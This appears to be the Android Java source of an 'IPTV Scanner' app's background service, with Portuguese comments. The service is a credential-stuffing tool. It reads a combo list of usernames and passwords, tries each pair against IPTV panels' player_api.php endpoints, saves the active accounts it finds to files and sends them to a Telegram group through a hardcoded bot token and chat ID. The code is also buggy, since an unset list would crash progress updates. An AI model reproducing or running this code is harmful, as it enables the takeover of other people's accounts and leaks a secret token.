package com.Scanner.IPTV;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import android.content.SharedPreferences;
import android.net.Uri;
import android.preference.PreferenceManager;
import androidx.documentfile.provider.DocumentFile;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class ScanService extends Service {

    public static final String CHANNEL_ID = "ScannerServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private ExecutorService executorService;
    private OkHttpClient httpClient;

    private List<String> panels;
    private List<String> combos;
    private List<String> proxies;
    private int speed;

    private AtomicInteger hitsCount = new AtomicInteger(0);
    private AtomicInteger failsCount = new AtomicInteger(0);
    private AtomicInteger currentIndex = new AtomicInteger(0);
    private boolean isRunning = false;

    private static ScanListener listener;

    public interface ScanListener {
        void onHitFound(Hit hit);
        void onStatusUpdate(int hitCount, int failCount);
        void onScanFinished(int hitCount, int failCount);
    }

    public static void setListener(ScanListener scanListener) {
        listener = scanListener;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        httpClient = new OkHttpClient();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            panels = intent.getStringArrayListExtra("panels");
            String comboFileUriString = intent.getStringExtra("combo_file_uri");
            speed = intent.getIntExtra("speed", 10);

            if (panels != null && !panels.isEmpty() && comboFileUriString != null) {
                startForeground(NOTIFICATION_ID, getNotification("Iniciando scan...", 0, 0));
                startScan(Uri.parse(comboFileUriString));
            } else {
                stopSelf();
            }
        }
        return START_NOT_STICKY;
    }

    private void startScan(Uri comboFileUri) {
        isRunning = true;
        hitsCount.set(0);
        failsCount.set(0);
        currentIndex.set(0);
        executorService = Executors.newFixedThreadPool(speed);

        for (int i = 0; i < speed; i++) {
            executorService.submit(() -> {
                try (InputStream inputStream = getContentResolver().openInputStream(comboFileUri);
                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                    String line;
                    while (isRunning && (line = reader.readLine()) != null) {
                        if (line.contains(":")) {
                            String[] parts = line.split(":");
                            String user = parts[0].trim();
                            String pass = parts[1].trim();
                            for (String panel : panels) {
                                checkCombo(panel, user, pass);
                            }
                        }
                        currentIndex.incrementAndGet();
                        updateNotification();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            });
        }

        // Shutdown executor service when all tasks are submitted
        executorService.shutdown();
        new Thread(() -> {
            while (!executorService.isTerminated()) {
                // Wait for all tasks to complete
            }
            stopScan();
        }).start();
    }

    private void stopScan() {
        isRunning = false;
        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
        }
        if (listener != null) {
            listener.onScanFinished(hitsCount.get(), failsCount.get());
        }
        stopForeground(true);
        stopSelf();
    }

    private void checkCombo(String panel, String user, String pass) {
        try {
            String urlBase = String.format("http://%s/player_api.php?username=%s&password=%s&type=m3u",
                    panel, user, pass);
            String fetchUrl = urlBase;

            // Implementar lógica de proxy aqui se necessário
            // Por simplicidade, esta implementação não usa proxy real, apenas simula
            // if (proxies != null && !proxies.isEmpty()) {
            //     String proxy = getNextProxy(); // Implementar lógica para obter próximo proxy
            //     fetchUrl = String.format("http://%s/proxy?url=%s", proxy, URLEncoder.encode(urlBase, "UTF-8"));
            // }

            Request request = new Request.Builder().url(fetchUrl).build();
            Response response = httpClient.newCall(request).execute();

            if (response.isSuccessful() && response.body() != null) {
                String responseBody = response.body().string();
                JSONObject jsonResponse = new JSONObject(responseBody);

                if (jsonResponse.has("user_info")) {
                    JSONObject userInfo = jsonResponse.getJSONObject("user_info");
                    if ("Active".equals(userInfo.getString("status"))) {
                        String expDate = userInfo.has("exp_date") ?
                                new java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(new java.util.Date(userInfo.getLong("exp_date") * 1000)) :
                                "Ilimitado";
                        String activeCons = userInfo.has("active_cons") ? userInfo.getString("active_cons") : "?";

                        String port = "80";
                        if (panel.contains(":")) {
                            port = panel.split(":")[1];
                        }
                        Hit hit = new Hit(user, pass, panel, expDate, activeCons, port);
                        hitsCount.incrementAndGet();
                        if (listener != null) {
                            listener.onHitFound(hit);
                        }
                        saveHitToFile(hit, panel);
                        sendToTelegram(hit);
                    } else {
                        failsCount.incrementAndGet();
                    }
                } else {
                    failsCount.incrementAndGet();
                }
            } else {
                failsCount.incrementAndGet();
            }
        } catch (IOException | JSONException e) {
            failsCount.incrementAndGet();
            Log.e("ScanService", "Erro ao verificar combo: " + e.getMessage());
        }
    }

    private void sendToTelegram(Hit hit) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        boolean telegramEnabled = prefs.getBoolean("telegram_enabled", true);
        if (!telegramEnabled) {
            return;
        }

        String botToken = prefs.getString("telegram_bot_token", "8245169261:AAHTUygk3X99DtXysRwkPcjM7cYo0-FNpcQ");
        String groupId = prefs.getString("telegram_group_id", "-1002710854837");
        String message = hit.getFormattedText();

        try {
            String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + groupId + "&text=" + java.net.URLEncoder.encode(message, "UTF-8");
            Request request = new Request.Builder().url(url).build();
            httpClient.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void saveHitToFile(Hit hit, String panel) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        String directoryUriString = prefs.getString("hits_directory", null);
        if (directoryUriString == null) {
            return;
        }

        Uri directoryUri = Uri.parse(directoryUriString);
        DocumentFile directory = DocumentFile.fromTreeUri(this, directoryUri);

        if (directory != null && directory.exists() && directory.isDirectory()) {
            String fileName = panel.replaceAll("[^a-zA-Z0-9.-]", "_") + ".txt";
            DocumentFile file = directory.findFile(fileName);
            if (file == null) {
                file = directory.createFile("text/plain", fileName);
            }

            try (OutputStream os = getContentResolver().openOutputStream(file.getUri(), "wa")) {
                if (os != null) {
                    os.write((hit.getFormattedText() + "\n\n").getBytes());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    getString(R.string.notification_channel_name),
                    NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription(getString(R.string.notification_channel_desc));
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private android.app.Notification getNotification(String text, int progress, int max) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(text)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .setOngoing(true);

        if (max > 0) {
            builder.setProgress(max, progress, false);
        } else {
            builder.setProgress(0, 0, true); // Indeterminate progress
        }
        return builder.build();
    }

    private void updateNotification() {
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        int totalCombos = combos.size();
        int currentProgress = currentIndex.get();
        String statusText = getString(R.string.notification_text, hitsCount.get(), failsCount.get());
        
        notificationManager.notify(NOTIFICATION_ID, getNotification(statusText, currentProgress, totalCombos));

        if (listener != null) {
            listener.onStatusUpdate(hitsCount.get(), failsCount.get());
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopScan();
        Log.d("ScanService", "Service destroyed");
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

